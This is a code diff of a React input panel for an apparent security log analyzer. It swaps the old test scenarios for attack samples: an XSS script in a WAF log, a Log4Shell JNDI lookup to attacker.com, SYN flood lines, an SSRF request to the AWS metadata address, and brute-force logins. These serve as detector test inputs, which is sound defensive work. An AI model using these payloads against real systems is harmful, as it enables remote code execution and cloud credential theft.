@@ -1,49 +1,43 @@
 import { useState, useRef } from 'react';
 
 const INPUT_TYPES = [
-  { key: 'log', label: '📋 Log', desc: 'Analyze log files' },
-  { key: 'text', label: '📝 Text', desc: 'Analyze plain text' },
-  { key: 'file', label: '📁 File', desc: 'Upload a file' },
-  { key: 'sql', label: '🗃️ SQL', desc: 'Analyze SQL queries' },
-  { key: 'chat', label: '💬 Chat', desc: 'Analyze chat messages' },
+  { key: 'log', label: 'LOG', desc: 'Analyze server & application logs' },
+  { key: 'network', label: 'PACKET', desc: 'Deep heuristic scan on network traffic' },
+  { key: 'sql', label: 'SQL', desc: 'Detect injection vectors in queries' },
+  { key: 'text', label: 'TEXT', desc: 'Raw text anomaly detection' },
+  { key: 'file', label: 'FILE', desc: 'Upload direct forensics artifact' },
 ];
 
 const TEST_SCENARIOS = [
   {
-    id: 'basic',
-    name: '🔒 Basic Leak',
+    id: 'xss-waf',
+    name: 'WAF Bypass (XSS)',
     type: 'log',
-    content: `2026-03-10 10:00:01 INFO User login\nemail=admin@company.com\npassword=admin123\napi_key=sk-prod-xyz`
+    content: `<134>Mar 24 07:30:01 TWIN ASM: uri="/search?q=<script>alert(document.domain)</script>" request_status="passed" violation_rating="5" staged_sig_names="XSS script tag (URI)" method="GET" response_code="200" ip_client="193.17.57.100"`
   },
   {
-    id: 'stack',
-    name: '🛠️ Stack Trace',
+    id: 'log4shell',
+    name: 'Log4Shell (RCE)',
     type: 'log',
-    content: `2026-03-10 ERROR NullPointerException at service.java:45\nDEBUG stack trace: line 45 -> service failed`
+    content: `2026-03-24 10:15:22 ERROR [App] User-Agent: \${jndi:ldap://attacker.com/Exploit}\nException in thread "main" java.lang.NullPointerException`
+  },
+  {
+    id: 'network-scan',
+    name: 'SYN Flood',
+    type: 'network',
+    content: `10.0.0.5 -> 192.168.1.100 TCP SYN\n10.0.0.5 -> 192.168.1.100 TCP SYN\n10.0.0.5 -> 192.168.1.100 TCP SYN\n10.0.0.5 -> 192.168.1.100 TCP SYN`
+  },
+  {
+    id: 'ssrf',
+    name: 'AWS SSRF',
+    type: 'log',
+    content: `GET /webhook?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\nHost: api.internal.corp`
   },
   {
     id: 'brute',
-    name: '🛡️ Brute Force',
+    name: 'Brute Force',
     type: 'log',
-    content: `2026-03-10 INFO login failed for user admin\n2026-03-10 INFO login failed for user admin\n2026-03-10 INFO login failed for user admin\n2026-03-10 INFO login failed for user admin\n2026-03-10 INFO login failed for user admin`
-  },
-  {
-    id: 'token',
-    name: '🔑 Token Exposure',
-    type: 'log',
-    content: `INFO token=abc123xyz\nINFO api_key=sk-test-987654`
-  },
-  {
-    id: 'clean',
-    name: '✅ Clean Log',
-    type: 'log',
-    content: `2026-03-10 INFO Server started successfully\n2026-03-10 INFO Health check passed`
-  },
-  {
-    id: 'mixed',
-    name: '🎭 Mixed Case',
-    type: 'log',
-    content: `2026-03-10 INFO User login\nemail=user@test.com\npassword=pass123\n2026-03-10 ERROR Exception at controller.java:22\nDEBUG mode enabled\ntoken=xyz-token-123`
+    content: `[2026-03-24 09:00:01] failed login for user admin\n[2026-03-24 09:00:02] failed login for user admin\n[2026-03-24 09:00:03] failed login for user admin\n[2026-03-24 09:00:04] failed login for user admin`
   }
 ];
 
@@ -52,18 +46,21 @@ export default function InputPanel({ onAnalyze, isLoading }) {
   const [content, setContent] = useState('');
   const [fileName, setFileName] = useState('');
   const [dragging, setDragging] = useState(false);
-  const [options, setOptions] = useState({
-    mask: true,
-    block_high_risk: true,
-    log_analysis: true,
-  });
   const fileInputRef = useRef(null);
+
+  // Protocol Card Options
+  const [options, setOptions] = useState({
+    containment: true,
+    deepScan: true,
+    obfuscation: false,
+  });
+
+  const toggleOption = (key) => setOptions(prev => ({ ...prev, [key]: !prev[key] }));
 
   const handleFileRead = (file) => {
     setFileName(file.name);
     const reader = new FileReader();
     reader.onload = (e) => {
-      // Split off the "data:application/pdf;base64," prefix to get pure base64
       const base64Data = e.target.result.split(',')[1] || e.target.result;
       setContent(base64Data);
     };
@@ -83,7 +80,11 @@ export default function InputPanel({ onAnalyze, isLoading }) {
       input_type: inputType,
       content: content,
       file_name: fileName,
-      options,
+      options: {
+        mask: options.obfuscation,
+        block_high_risk: options.containment,
+        log_analysis: options.deepScan,
+      }
     });
   };
 
@@ -93,23 +94,18 @@ export default function InputPanel({ onAnalyze, isLoading }) {
     setFileName('');
   };
 
-  const toggleOption = (key) => {
-    setOptions((prev) => ({ ...prev, [key]: !prev[key] }));
-  };
-
   const placeholders = {
-    log: 'Paste log content here...',
-    text: 'Enter text to analyze for sensitive data...',
+    log: 'Paste system or application logs here (supports F5 ASM, Syslog, Apache, etc)...',
+    network: 'Paste raw packets, PCAP ASCII dumps, or tcpdump output...',
+    text: 'Enter text to scan for credentials and anomalies...',
     file: 'File content will appear here after upload...',
-    sql: 'Enter SQL query to analyze...',
-    chat: 'Enter chat message to analyze...',
+    sql: 'Enter SQL query to analyze for injection vectors...',
   };
 
   return (
     <div className="input-panel glass-card">
       <div className="card-title">
-        <span className="icon">🔍</span>
-        Input Analysis
+        INPUT ANALYSIS
       </div>
 
       {/* Type Selector */}
@@ -120,7 +116,6 @@ export default function InputPanel({ onAnalyze, isLoading }) {
             className={`type-btn ${inputType === t.key ? 'active' : ''}`}
             onClick={() => setInputType(t.key)}
             title={t.desc}
-            id={`type-btn-${t.key}`}
           >
             {t.label}
           </button>
@@ -128,7 +123,7 @@ export default function InputPanel({ onAnalyze, isLoading }) {
       </div>
 
       {/* File Upload Zone */}
-      {(inputType === 'file' || inputType === 'log') && (
+      {(inputType === 'file') && (
         <>
           <div
             className={`file-drop-zone ${dragging ? 'dragging' : ''}`}
@@ -136,13 +131,8 @@ export default function InputPanel({ onAnalyze, isLoading }) {
             onDragLeave={() => setDragging(false)}
             onDrop={handleDrop}
             onClick={() => fileInputRef.current?.click()}
-            id="file-drop-zone"
           >
-            <div className="drop-icon">📂</div>
-            <div className="drop-text">
-              Drop a file here or click to upload
-            </div>
-            <div className="drop-hint">.log, .txt, .pdf, .doc supported</div>
+            <div className="drop-text">Drop a file here or click to upload</div>
           </div>
           <input
             ref={fileInputRef}
@@ -153,35 +143,34 @@ export default function InputPanel({ onAnalyze, isLoading }) {
               const file = e.target.files[0];
               if (file) handleFileRead(file);
             }}
-            id="file-input"
           />
           {fileName && (
             <div className="file-name">
-              📎 {fileName}
+              DATASTREAM: {fileName}
             </div>
           )}
         </>
       )}
 
       {/* Text Input */}
-      <textarea
-        className="text-input"
-        placeholder={placeholders[inputType]}
-        value={content}
-        onChange={(e) => setContent(e.target.value)}
-        id="content-textarea"
-      />
+      {inputType !== 'file' && (
+        <textarea
+          className="text-input"
+          placeholder={placeholders[inputType]}
+          value={content}
+          onChange={(e) => setContent(e.target.value)}
+        />
+      )}
 
       {/* Test Scenarios */}
       <div className="test-scenarios">
-        <div style={{ fontSize: '0.75rem', opacity: 0.6, marginBottom: '8px' }}>Test Scenarios:</div>
+        <div style={{ fontSize: '0.65rem', opacity: 0.6, marginBottom: '8px', textTransform: 'uppercase', letterSpacing: '0.1em', fontWeight: 700 }}>Inject Threat Telemetry:</div>
         <div className="scenario-grid">
           {TEST_SCENARIOS.map((s) => (
             <button
               key={s.id}
               className="scenario-chip"
               onClick={() => loadScenario(s)}
-              id={`scenario-btn-${s.id}`}
             >
               {s.name}
             </button>
@@ -189,26 +178,45 @@ export default function InputPanel({ onAnalyze, isLoading }) {
           <button
             className="scenario-chip clear"
             onClick={() => { setContent(''); setFileName(''); }}
-            id="scenario-btn-clear"
           >
-            🗑️ Clear
+            [X] CLEAR
           </button>
         </div>
       </div>
 
-      {/* Options */}
-      <div className="options-group">
-        <div className="option-toggle" onClick={() => toggleOption('mask')}>
-          <span className="option-label">🔒 Mask sensitive data</span>
-          <div className={`toggle-switch ${options.mask ? 'on' : ''}`} />
+      {/* Protocol Cards */}
+      <div className="protocol-grid">
+        <div 
+          className={`protocol-card ${options.containment ? 'active' : ''}`}
+          onClick={() => toggleOption('containment')}
+        >
+          <div className="protocol-title">
+            ZERO-TRUST CONTAINMENT
+            <span className="protocol-badge">[ACTIVE]</span>
+          </div>
+          <div className="protocol-desc">Auto-blocks traffic exceeding critical risk thresholds prior to application layer execution.</div>
         </div>
-        <div className="option-toggle" onClick={() => toggleOption('block_high_risk')}>
-          <span className="option-label">🛡️ Block high risk</span>
-          <div className={`toggle-switch ${options.block_high_risk ? 'on' : ''}`} />
+
+        <div 
+          className={`protocol-card ${options.deepScan ? 'active' : ''}`}
+          onClick={() => toggleOption('deepScan')}
+        >
+          <div className="protocol-title">
+            DEEP-PACKET HEURISTIC SCAN
+            <span className="protocol-badge">[ACTIVE]</span>
+          </div>
+          <div className="protocol-desc">Engages AI layer to detect zero-day evasion techniques and contextual logic bypasses.</div>
         </div>
-        <div className="option-toggle" onClick={() => toggleOption('log_analysis')}>
-          <span className="option-label">📊 Deep log analysis</span>
-          <div className={`toggle-switch ${options.log_analysis ? 'on' : ''}`} />
+
+        <div 
+          className={`protocol-card ${options.obfuscation ? 'active' : ''}`}
+          onClick={() => toggleOption('obfuscation')}
+        >
+          <div className="protocol-title">
+            QUANTUM DATA OBFUSCATION
+            <span className="protocol-badge">[ACTIVE]</span>
+          </div>
+          <div className="protocol-desc">Surgically redacts PII, tokens, and credentials from the data stream before downstream processing.</div>
         </div>
       </div>
 
@@ -217,13 +225,8 @@ export default function InputPanel({ onAnalyze, isLoading }) {
         className="analyze-btn"
         onClick={handleSubmit}
         disabled={isLoading || !content.trim()}
-        id="analyze-btn"
       >
-        {isLoading ? (
-          <><span className="spinner" /> Analyzing...</>
-        ) : (
-          '🚀 Analyze Content'
-        )}
+        {isLoading ? 'ANALYZING...' : 'INITIALIZE SCAN'}
       </button>
     </div>
   );
